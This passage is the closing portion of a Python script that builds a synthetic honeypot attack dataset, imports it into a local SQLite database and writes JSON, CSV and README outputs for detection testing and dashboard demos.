                deleted += cur.rowcount if cur.rowcount and cur.rowcount > 0 else 0

        for geo in bundle.get('geoip', []):
            conn.execute(
                '''INSERT OR REPLACE INTO geo_ip
                   (ip, country, province, city, latitude, longitude, isp, update_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                (geo['ip'], geo['country'], geo['province'], geo['city'],
                 geo['latitude'], geo['longitude'], geo['isp'],
                 bundle['dataset']['generated_at'].replace('T', ' ')[:19]),
            )

        inserted_events = 0
        inserted_raw = 0
        for event in bundle.get('events', []):
            raw_id = None
            raw = event.get('raw_request')
            if raw:
                cur = conn.execute(
                    '''INSERT INTO raw_request
                       (session_id, src_ip, method, path, query_string, headers, body,
                        user_agent, referer, content_type, content_length,
                        is_suspicious, threat_score, create_time)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (event['session_id'], event['src_ip'], raw.get('method', ''),
                     raw.get('path', ''), raw.get('query_string', ''),
                     json.dumps(raw.get('headers', {}), ensure_ascii=False),
                     raw.get('body', ''), raw.get('user_agent', ''),
                     raw.get('referer', ''), raw.get('content_type', ''),
                     int(raw.get('content_length') or 0),
                     int(raw.get('is_suspicious') or 0),
                     int(raw.get('threat_score') or 0),
                     raw.get('create_time') or event['timestamp']),
                )
                raw_id = cur.lastrowid
                inserted_raw += 1
            conn.execute(
                '''INSERT INTO event_log
                   (timestamp, source, severity, event_type, src_ip, session_id,
                    tags, payload, raw_ref, raw_request_id, extra)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (event['timestamp'], event['source'], event['severity'],
                 event['event_type'], event['src_ip'], event['session_id'],
                 json.dumps(event.get('tags', []), ensure_ascii=False),
                 event.get('payload', ''),
                 ('raw_request:%s' % raw_id) if raw_id else '',
                 raw_id,
                 json.dumps(event.get('extra', {}), ensure_ascii=False)),
            )
            inserted_events += 1

        for session in bundle.get('sessions', []):
            conn.execute(
                '''INSERT OR REPLACE INTO session_track
                   (session_id, src_ip, first_seen, last_seen, request_count,
                    path_sequence, is_attacker, threat_level)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                (session['session_id'], session['src_ip'], session['first_seen'],
                 session['last_seen'], session['request_count'],
                 session['path_sequence'], int(session['is_attacker']),
                 session['threat_level']),
            )
        conn.commit()

        return {
            'db': str(db_path),
            'backup': str(backup_path) if backup_path else '',
            'deleted_synthetic': deleted,
            'inserted_events': inserted_events,
            'inserted_raw_requests': inserted_raw,
            'inserted_sessions': len(bundle.get('sessions', [])),
        }
    finally:
        conn.close()


def write_outputs(bundle, output_dir):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    dataset = bundle['dataset']

    bundle_path = output_dir / 'attack_bundle.json'
    bundle_path.write_text(json.dumps(bundle, ensure_ascii=False, indent=2), encoding='utf-8')

    jsonl_path = output_dir / 'attack_events.jsonl'
    with jsonl_path.open('w', encoding='utf-8', newline='\n') as fh:
        for event in bundle['events']:
            fh.write(json.dumps(event, ensure_ascii=False) + '\n')

    csv_path = output_dir / 'attack_events.csv'
    fields = ['dataset_id', 'event_id', 'timestamp', 'source', 'severity',
              'event_type', 'src_ip', 'session_id', 'score', 'method', 'path',
              'query_string', 'payload', 'tags']
    with csv_path.open('w', encoding='utf-8-sig', newline='') as fh:
        writer = csv.DictWriter(fh, fieldnames=fields)
        writer.writeheader()
        for event in bundle['events']:
            raw = event.get('raw_request') or {}
            writer.writerow({
                'dataset_id': dataset['id'],
                'event_id': event['event_id'],
                'timestamp': event['timestamp'],
                'source': event['source'],
                'severity': event['severity'],
                'event_type': event['event_type'],
                'src_ip': event['src_ip'],
                'session_id': event['session_id'],
                'score': event.get('extra', {}).get('score', ''),
                'method': raw.get('method', ''),
                'path': raw.get('path', ''),
                'query_string': raw.get('query_string', ''),
                'payload': event.get('payload', ''),
                'tags': '|'.join(event.get('tags', [])),
            })

    geo_path = output_dir / 'geoip.csv'
    with geo_path.open('w', encoding='utf-8-sig', newline='') as fh:
        writer = csv.DictWriter(fh, fieldnames=['ip', 'country', 'province', 'city',
                                                'latitude', 'longitude', 'isp'])
        writer.writeheader()
        for geo in bundle.get('geoip', []):
            writer.writerow(geo)

    _write_readme(bundle, output_dir)
    return {
        'bundle': bundle_path,
        'jsonl': jsonl_path,
        'csv': csv_path,
        'geoip': geo_path,
        'readme': output_dir / 'README.md',
    }


def _write_readme(bundle, output_dir):
    dataset = bundle['dataset']
    lines = [
        '# 蜜罐合成攻击数据',
        '',
        '数据集编号：`%s`' % dataset['id'],
        '生成时间：%s' % dataset['generated_at'],
        '事件数量：%d；攻击场景：%d；原始 HTTP 请求：%d' % (
            dataset['event_count'], dataset['scenario_count'],
            sum(1 for e in bundle['events'] if e.get('raw_request'))),
        '',
        '> 本数据集为**合成数据**，仅用于本机蜜罐演示、检测规则验证和 Dashboard 可视化。',
        '> 所有来源 IP 均为 RFC 5737 文档保留地址，不对应真实目标；',
        '> 其中的命令、口令和上传内容均为无害演示样本。',
        '',
        '## 文件说明',
        '',
        '| 文件 | 说明 |',
        '| --- | --- |',
        '| `attack_bundle.json` | 完整数据包：事件、原始请求、会话、GeoIP、场景元数据 |',
        '| `attack_events.jsonl` | 每行一个事件，便于流式读取或接入其他工具 |',
        '| `attack_events.csv` | 扁平化事件表，可直接用 Excel 打开 |',
        '| `geoip.csv` | 演示 IP 的地理位置映射 |',
        '| `README.md` | 本说明 |',
        '',
        '## 数据字段',
        '',
        '- `event_log`：`timestamp / source / severity / event_type / src_ip / session_id / tags / payload / raw_request_id / extra`',
        '- `raw_request`：HTTP 方法、路径、查询串、请求头、请求体、UA、风险分等',
        '- `session_track`：Web 攻击链的路径序列、请求数和威胁等级',
        '- `geo_ip`：演示用国家/城市/经纬度缓存，确保地图离线可见',
        '',
        '## 场景构成',
        '',
        '| 场景 | 来源 IP | 事件数 | Web 请求数 |',
        '| --- | --- | ---: | ---: |',
    ]
    for item in bundle['scenarios']:
        lines.append('| %s | `%s` | %d | %d |' % (
            item['title'], item['src_ip'], item['events'], item['web_requests']))
    lines += [
        '',
        '## 导入本机数据库',
        '',
        '```powershell',
        '# 仅生成文件，不写数据库',
        'python scripts/generate_attack_data.py',
        '',
        '# 生成并追加导入 database/event_logs.db（导入前自动备份）',
        'python scripts/generate_attack_data.py --load',
        '',
        '# 先清理旧的 synth-* 合成会话，再导入本次数据',
        'python scripts/generate_attack_data.py --load --reset-demo',
        '```',
        '',
        '`--reset-demo` 只会删除 `session_id LIKE \'synth-%\'` 的合成记录，',
        '不会删除真实蜜罐事件。导入后启动 `python main.py`，登录 Dashboard 查看。',
        '',
        '## 使用边界',
        '',
        '- 这些行是**记录数据**，不是攻击流量；不会向任何主机发包。',
        '- 如需真实产生蜜罐事件，请使用项目已有的本机回环演示脚本：',
        '  `scripts/mixed_attack_demo.py`、`scripts/demo/protocol_traffic.py`。',
        '- 不要把这些合成 IP、账号或命令用于未授权目标。',
        '',
    ]
    (Path(output_dir) / 'README.md').write_text('\n'.join(lines), encoding='utf-8')


def parse_args(argv=None):
    p = argparse.ArgumentParser(description='生成/导入蜜罐合成攻击数据（默认只写文件，不联网）')
    p.add_argument('--output', default=str(DEFAULT_OUT), help='输出目录')
    p.add_argument('--seed', type=int, default=20261107, help='随机种子')
    p.add_argument('--load', action='store_true', help='导入本地 SQLite 数据库')
    p.add_argument('--db', default=str(DEFAULT_DB), help='目标 SQLite 数据库路径')
    p.add_argument('--reset-demo', action='store_true', help='导入前删除旧的 synth-* 合成记录')
    p.add_argument('--list', action='store_true', help='只列出场景，不生成文件')
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    if args.list:
        for i, scenario in enumerate(SCENARIOS, 1):
            print('%02d  %-28s %-16s %2d 个事件  %s' % (
                i, scenario['key'], scenario['ip'], len(scenario['steps']),
                scenario['title']))
        return 0
    if args.reset_demo and not args.load:
        print('--reset-demo 需要与 --load 一起使用', file=sys.stderr)
        return 2

    bundle = build_bundle(args.seed)
    paths = write_outputs(bundle, args.output)
    dataset = bundle['dataset']
    print('数据集：%s' % dataset['id'])
    print('事件：%d，场景：%d，时间窗：%s ~ %s' % (
        dataset['event_count'], dataset['scenario_count'],
        dataset['window_start'], dataset['window_end']))
    for key, path in paths.items():
        print('%-8s %s' % (key, path.resolve()))

    if args.load:
        result = import_bundle(bundle, args.db, reset_demo=args.reset_demo)
        print('数据库：%s' % Path(result['db']).resolve())
        if result['backup']:
            print('备份：%s' % Path(result['backup']).resolve())
        print('清理旧合成记录：%d；写入事件：%d；原始请求：%d；会话：%d' % (
            result['deleted_synthetic'], result['inserted_events'],
            result['inserted_raw_requests'], result['inserted_sessions']))
    return 0


if __name__ == '__main__':
    for stream in (sys.stdout, sys.stderr):
        if hasattr(stream, 'reconfigure'):
            stream.reconfigure(encoding='utf-8', errors='replace')
    raise SystemExit(main())
